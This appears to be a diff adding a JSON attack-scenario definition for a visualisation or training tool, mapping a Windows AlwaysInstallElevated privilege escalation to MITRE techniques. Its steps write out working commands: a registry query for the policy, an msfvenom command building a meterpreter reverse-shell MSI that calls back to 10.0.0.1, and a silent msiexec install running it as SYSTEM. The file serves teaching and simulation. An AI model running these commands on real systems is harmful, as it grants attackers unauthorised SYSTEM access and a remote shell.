@@ -1,0 +1,154 @@
+{
+  "id": "fde12b39-2a91-45cd-a937-299f2b3e8c33",
+  "schemaVersion": "1.0",
+  "name": "AlwaysInstallElevated Abuse",
+  "description": "Installing a malicious MSI file with SYSTEM privileges due to an insecure Group Policy misconfiguration.",
+  "mitreTechniques": [
+    "T1548.002",
+    "T1082",
+    "T1587.001"
+  ],
+  "entities": {
+    "nodes": [
+      {
+        "id": "attacker_machine",
+        "label": "Attacker Operator",
+        "type": "Attacker",
+        "group": "Threat Actor"
+      },
+      {
+        "id": "registry",
+        "label": "Windows Registry",
+        "type": "Database",
+        "group": "System Configuration"
+      },
+      {
+        "id": "malicious_msi",
+        "label": "Malicious MSI Payload",
+        "type": "File",
+        "group": "Attacker Artifacts",
+        "properties": {
+          "filename": "payload.msi"
+        }
+      },
+      {
+        "id": "msiserver",
+        "label": "Windows Installer Service",
+        "type": "Process",
+        "group": "System Components",
+        "properties": {
+          "process": "msiserver"
+        }
+      },
+      {
+        "id": "system_shell",
+        "label": "SYSTEM Reverse Shell",
+        "type": "NetworkConnection",
+        "group": "Attacker Artifacts"
+      }
+    ],
+    "edges": []
+  },
+  "initialVisibility": {
+    "nodes": [
+      "attacker_machine",
+      "registry",
+      "msiserver"
+    ],
+    "edges": []
+  },
+  "steps": [
+    {
+      "id": 1,
+      "title": "Enumerate AlwaysInstallElevated Policy",
+      "description": "Query both HKCU and HKLM registry hives to confirm the AlwaysInstallElevated policy is actively enforced (Value = 1).",
+      "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "mitre": "T1082",
+      "status": "success",
+      "impact": "Confirmed policy is active, meaning ANY user can install software as SYSTEM.",
+      "visibilityChanges": {
+        "showNodes": [],
+        "showEdges": [
+          "e_enum_reg"
+        ]
+      },
+      "newEdges": [
+        {
+          "id": "e_enum_reg",
+          "source": "attacker_machine",
+          "target": "registry",
+          "label": "Query Policy",
+          "type": "Reconnaissance"
+        }
+      ]
+    },
+    {
+      "id": 2,
+      "title": "Generate Malicious MSI",
+      "description": "Use MSFvenom to compile a reverse shell payload wrapped natively inside a Microsoft Installer (.msi) package.",
+      "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o payload.msi",
+      "mitre": "T1587.001",
+      "status": "success",
+      "impact": "Malware compiled and ready for deployment.",
+      "visibilityChanges": {
+        "showNodes": [
+          "malicious_msi"
+        ],
+        "showEdges": [
+          "e_create_msi"
+        ]
+      },
+      "newEdges": [
+        {
+          "id": "e_create_msi",
+          "source": "attacker_machine",
+          "target": "malicious_msi",
+          "label": "Compile Payload",
+          "type": "FileDrop"
+        }
+      ]
+    },
+    {
+      "id": 3,
+      "title": "Execute Silent Installation",
+      "description": "Invoke msiexec to install the malicious package silently, suppressing UI popups. The system elevates the installer automatically.",
+      "command": "msiexec /quiet /qn /i C:\\Temp\\payload.msi",
+      "mitre": "T1548.002",
+      "status": "success",
+      "impact": "msiserver spawns a child process executing the MSI Custom Action as SYSTEM.",
+      "visibilityChanges": {
+        "showNodes": [
+          "system_shell"
+        ],
+        "showEdges": [
+          "e_execute_msi",
+          "e_msiserver_elevate",
+          "e_reverse_shell"
+        ]
+      },
+      "newEdges": [
+        {
+          "id": "e_execute_msi",
+          "source": "attacker_machine",
+          "target": "malicious_msi",
+          "label": "Invoke msiexec",
+          "type": "CommandExecution"
+        },
+        {
+          "id": "e_msiserver_elevate",
+          "source": "msiserver",
+          "target": "malicious_msi",
+          "label": "Execute (SYSTEM)",
+          "type": "ProcessSpawn"
+        },
+        {
+          "id": "e_reverse_shell",
+          "source": "malicious_msi",
+          "target": "system_shell",
+          "label": "Callback",
+          "type": "NetworkConnection"
+        }
+      ]
+    }
+  ]
+}
